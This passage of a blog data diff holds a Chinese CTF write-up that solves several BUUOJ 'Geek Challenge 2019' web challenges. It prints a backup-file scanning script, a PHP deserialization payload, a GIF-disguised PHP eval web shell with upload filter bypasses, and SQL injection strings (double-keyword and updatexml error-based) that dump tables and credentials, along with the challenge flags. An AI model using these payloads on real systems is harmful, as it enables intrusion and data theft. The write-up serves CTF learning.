+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">Referer: https://www.Sycsecret.com</span><br><span class="line">User-Agent: Syclover</span><br><span class="line">X-Forwarded-For: localhost</span><br></pre></td></tr></table></figure>
+<p>即可得到flag</p>
+<blockquote>
+<p>flag{da768d87-8706-4596-bf42-71c1b8fa6453}</p>
+</blockquote>
+<h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>有提示可以知道有网站备份文件</p>
+<p>运用脚本进行扫描</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url1 = <span class="string">&#x27;http://bb232cbc-9635-4f1f-bbdb-d01f82b431ee.node3.buuoj.cn/&#x27;</span>		<span class="comment"># url为被扫描地址，后不加‘/’</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 常见的网站源码备份文件名</span></span><br><span class="line">list1 = [<span class="string">&#x27;web&#x27;</span>, <span class="string">&#x27;website&#x27;</span>, <span class="string">&#x27;backup&#x27;</span>, <span class="string">&#x27;back&#x27;</span>, <span class="string">&#x27;www&#x27;</span>, <span class="string">&#x27;wwwroot&#x27;</span>, <span class="string">&#x27;temp&#x27;</span>]</span><br><span class="line"><span class="comment"># 常见的网站源码备份文件后缀</span></span><br><span class="line">list2 = [<span class="string">&#x27;tar&#x27;</span>, <span class="string">&#x27;tar.gz&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;rar&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> list2:</span><br><span class="line">        back = <span class="built_in">str</span>(i) + <span class="string">&#x27;.&#x27;</span> + <span class="built_in">str</span>(j)</span><br><span class="line">        url = <span class="built_in">str</span>(url1) + <span class="string">&#x27;/&#x27;</span> + back</span><br><span class="line">        print(back + <span class="string">&#x27;    &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        print(requests.get(url).status_code)</span><br></pre></td></tr></table></figure>
+<p>得到一个<a href="http://www.zip/">www.zip</a></p>
+<p>发现是一道php反序列化绕过，这里简化了一下代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>根据代码构造payload</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">select=O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;\0Name\0username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;\0Name\0password&quot;</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure>
+<p>然后用python提交get，成功得到flag（虽然不知道为啥Hackbar提交没反应</p>
+<blockquote>
+<p>flag{361e4af6-f242-4f37-888e-17491b76ecd2}</p>
+</blockquote>
+<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>进入发现需要上传文件，构造一个一句话木马扔上去</p>
+<p>用burpsuites抓包改一下文件类型</p>
+<p>然后提示不能包含&lt;?字符，去度娘搜了一下之后发现可以在文件头部加上**GIF89a?**绕过这个点</p>
+<p>然后又提示不能用php类型文件</p>
+<p>一番查找了之后发现了一个.phtml类型</p>
+<p>重新构造了一下木马</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a?</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;rossweisse&#39;])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<p>用菜刀链接即可得到flag</p>
+<blockquote>
+<p>flag{43921141-5d8f-4c88-b07c-55b0801220ca}</p>
+</blockquote>
+<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>这题也是一道sql注入题</p>
+<p>按照原来的套路试了几次之后发现把关键字都ban了</p>
+<p>那么我们可双写关键字来进行绕过</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39; ununionion seselectlect 1,group_concat(table_name),3  frfromom infoorrmation_schema.tables whwhereere table_schema&#x3D;database() %23 #爆表名</span><br><span class="line">-1&#39; ununionion seselectlect 1,group_concat(column_name),3  frfromom infoorrmation_schema.columns whwhereere table_schema&#x3D;database() aandnd table_name&#x3D;&#39;b4bsql&#39; %23 #爆列名</span><br><span class="line">-1&#39; ununionion seselectlect 1,group_concat(concat_ws(0x7e,username,passwoorrd)),3  frfromom b4bsql %23 #爆数据</span><br></pre></td></tr></table></figure>
+<p>拿到flag</p>
+<blockquote>
+<p>flag{cbf6aeea-a401-4c47-b000-c373eaef6289}</p>
+</blockquote>
+<h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>这题进来之后发现只有一个payflag页面可以进</p>
+<p>进入之后ctrl+U在下面发现了一串代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">	~~~post money <span class="keyword">and</span> password~~~</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> (is_numeric(<span class="variable">$password</span>)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;<span class="keyword">elseif</span> (<span class="variable">$password</span> == <span class="number">404</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Password Right!&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+<p>可以得知咱要以POST方式发送一个不是数字并且要等于404的password变量和money变量</p>
+<p>发现burpsuite重发之后会出现一句<strong>Only Cuit’s students can buy the FLAG</strong></p>
+<p>这里咱重新查看下抓的包，发现了一个user参数，令user=1</p>
+<p>发送出去之后前两个都正确了，但是还是出现了一句<strong>Nember lenth is too long</strong></p>
+<p>那只能是money参数出现了问题，将money=100000000改为money=1e9即可得到flag</p>
+<p><img src="https://i.loli.net/2021/03/14/LSq3PIr8Q2TlzcO.png"></p>
+<blockquote>
+<p>flag{68ff87f9-0c7f-4c49-b057-2af8e9ea3ed3}</p>
+</blockquote>
+<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>这题sql注入惯例试了下<strong>1’ or 1=1 %23</strong></p>
+<p>结果很友善的回了一句臭弟弟</p>
+<p>之后试了一下其他的发现把空格等一些字符还有union给ban了，于是就想到了报错注入</p>
+<p><strong>1’or(updatexml(1,concat_ws((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e,0x7e),1))%23 #爆表名</strong><br><strong>1’or(updatexml(1,concat_ws((select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database())),0x7e,0x7e),1))%23 #爆列名</strong><br><strong>1’or(updatexml(1,concat_ws((select(concat_ws(0x7e,username,password))from(H4rDsq1)),0x7e,0x7e),1))%23 #爆数据</strong>（结果发现只有一半，后面查到了一个right()</p>
+<p><strong>1’or(updatexml(1,concat_ws((select(right(group_concat(password),20))from(H4rDsq1)),0x7e,0x7e),1))%23 #爆后边的flag</strong>（这里要注意flag的连接，不是对半开的</p>
+<p>这里是flag</p>
+<blockquote>
+<p>flag{16f2507c-b985-4744-9b3b-8f02007f0c29}</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>WriteUp</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>BUUOJ</tag>
+        <tag>CTF</tag>
       </tags>
   </entry>
 </search>
